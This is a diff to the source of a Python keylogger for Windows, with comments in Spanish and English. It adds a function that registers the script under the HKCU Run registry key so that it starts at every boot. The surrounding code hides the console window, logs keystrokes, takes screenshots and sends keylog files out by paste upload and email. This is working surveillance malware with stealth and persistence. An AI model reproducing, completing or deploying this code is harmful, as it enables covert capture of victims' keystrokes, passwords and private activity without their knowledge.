@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/env python 
 # -*- coding: utf-8 -*-
 #
 #-----------------------------------------------------------------------------------------------------------
@@ -68,6 +68,7 @@ import time
 import urllib.request
 import win32console
 import win32gui
+import winreg
 import wx
 
 ########################################################
@@ -239,8 +240,18 @@ def paste_file():
     return paste_id
 
 
+# Añade al registro una clave para que se cargue el keylogger en cada inicio del sistema 
+# Add the file to the startup registry key
+def add_keylogger_to_startup():  
+    fp = os.path.dirname(os.path.realpath(__file__))
+    fileName = sys.argv[0].split('\\')[-1]
+    newFilePath = fp + '\\' + fileName
+    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
+    key2Change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
+    SetValueEx(key2Change, 'DEK', 0, REG_SZ, newFilePath)
 
-# función de envio de información por email (solo para depuración)
+
+# Envio de información por email (solo para depuración)
 def send_email(message):
     try:
         # Datos
@@ -265,7 +276,6 @@ def send_email(message):
 def hide_console():
     window = win32console.GetConsoleWindow()
     win32gui.ShowWindow(window,0)
-    return True
 
 
 # Obtiene la ip externa - Get the external ip
@@ -476,22 +486,28 @@ def on_close_program():
     global key_buffer, threadList
 
     # registra en fichero de log el cerrado del programa con fecha y hora
+    # saves to keylog file the Closing Event, Date and Time
     key_buffer += CRLF + CRLF
     key_buffer += '[CLOSING PROGRAM]' + CRLF
     key_buffer += 'datetime=' + datetime.datetime.now().strftime("%Y-%m-%d %H:%M") + CRLF
-    # se asegura de vaciar buffer
+    
+    # se asegura de vaciar buffer - empty the key buffer to disk
     flush_key_buffer_to_disk()
-    # envia ultimo fichero de log de teclas
+    
+    # envia ultimo fichero de log de teclas - send de last keylog capture file
     send_keylog_file()
-    # ejecuta captura de pantalla
+    
+    # ejecuta captura de pantalla - do a screenshot 
     capture_screen()
 
     # espera que finalicen todos los threads que pueda haber activos
+    # wait to all threads are finished
     for thr in threadList:
         thr.join()
 
-    # borra ficheros temporales
-
+    # borra ficheros temporales - delete temp files
+    # ... pending ...
+    
     logging.shutdown()
     return
 
@@ -518,6 +534,10 @@ driveunit = os.path.splitdrive(__file__)[0]
 
 # Parsea parametros recibidos - Parse parameters
 parse_params()
+
+# Se asegura de que el kelogger se inicia en cada arranque del sistema
+# Ensures that keylogger starts at system startup
+add_keylogger_to_startup()
 
 # Oculta ventana de aplicación - Hide console Window
 hide_console()
